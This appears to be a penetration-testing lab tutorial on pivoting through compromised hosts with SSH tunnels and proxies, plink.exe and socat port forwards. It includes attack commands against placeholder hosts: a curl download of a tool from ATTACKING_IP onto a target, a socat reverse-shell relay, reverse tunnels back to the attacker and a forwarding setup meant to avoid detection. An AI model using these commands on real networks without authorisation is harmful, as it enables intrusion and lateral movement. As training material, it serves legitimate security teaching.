# SSH Tunnelling / Port Forwarding

Forward Connections
Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

Port forwarding is accomplished with the -L switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:
ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN
We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 on our own attacking machine. For example, by entering localhost:8000 into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use sudo to create the connection. The -fN combined switch does two things: -f backgrounds the shell immediately so that we have our own terminal back. -N tells SSH that it doesn't need to execute any commands -- only set up the connection.

Proxies are made using the -D switch, for example: -D 1337. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:
ssh -D 1337 user@172.16.0.5 -fN
This again uses the -fN switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.


Reverse Connections

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine from the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:

First, generate a new set of SSH keys and store them somewhere safe (ssh-keygen):
This will create two new files: a private key, and a public key.

Copy the contents of the public key (the file ending with .pub), then edit the ~/.ssh/authorized_keys file on your own attacking machine. You may need to create the ~/.ssh directory and authorized_keys file first.
On a new line, type the following line, then paste in the public key:
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty
This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.
The final entry in the authorized_keys file should look something like this:
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty ssh-rsa
 AAAAB3Nza.....

Next. check if the SSH server on your attacking machine is running:
sudo systemctl status ssh

If the service is running then you should get a response that looks like this (with "active" shown in the message):

If the status command indicates that the server is not running then you can start the ssh service with:
sudo systemctl start ssh

The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

With the key transferred, we can then connect back with a reverse port forward using the following command:
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN

To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the -D switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:
ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems.
To close any of these connections, type ps aux | grep ssh into the terminal of the machine that created the connection:
Find the process ID (PID) of the connection. In the above image this is 105238.

Finally, type sudo kill PID to close the connection:

# plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

Notice that this syntax is nearly identical to previously when using the standard OpenSSH client. The cmd.exe /c echo y at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.

To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:
cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N

Note that any keys generated by ssh-keygen will not work properly here. You will need to convert them using the puttygen tool, which can be installed on Kali using sudo apt install putty-tools. After downloading the tool, conversion can be done with:
puttygen KEYFILE -o OUTPUT_KEY.ppk
Substituting in a valid file for the keyfile, and adding in the output file.

The resulting .ppk file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized_keys file before).

Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the .exe. Whilst there is a copy pre-installed on Kali at /usr/share/windows-resources/binaries/plink.exe, downloading a new copy from here before a new engagement is sensible.

# Socat

Socat is not just great for fully stable Linux shells[1], it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both Linux and Windows. Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have completed the What the Shell? room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.

Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.

Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above example we're creating a port forward from a port on the compromised server to a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the attacking machine with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.

Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

For example, with a Python webserver:-

On Kali (inside the directory containing your Socat binary):

sudo python3 -m http.server 80

Then, on the target:
curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME

With the binary uploaded, let's have a look at each of the above scenarios in turn.

Note: This uploads the socat binary with your username in the title; however, the example commands given in the rest of this task will refer to the binary simply as socat.

Reverse Shell Relay

In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a standard netcat listener on our attacking box (sudo nc -lvnp 443). Next, on the compromised server, use the following command to start the relay:
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &

Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.

From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:

brief explanation of the above command:

tcp-l:8000 is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
tcp:ATTACKING_IP:443 connects back to our local IP on port 443. The ATTACKING_IP obviously needs to be filled in correctly for this to work.
& backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.
The relay connects back to a listener started using an alias to a standard netcat listener: sudo nc -lvnp 443.

In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

Port Forwarding -- Easy

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &

This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The fork option is used to put every connection into a new process, and the reuseaddr option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use & to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.

We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

Port Forwarding -- Quiet

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &

This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &

This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:


The request goes to 127.0.0.1:8000
Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.
The process is then reversed when the target sends the response:

The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.
We have now achieved the same thing as previously, but without opening any ports on the server!

Finally, we've learnt how to create backgrounded socat port forwards and relays, but it's important to also know how to close these. The solution is simple: run the jobs command in your terminal, then kill any socat processes using kill %NUMBER: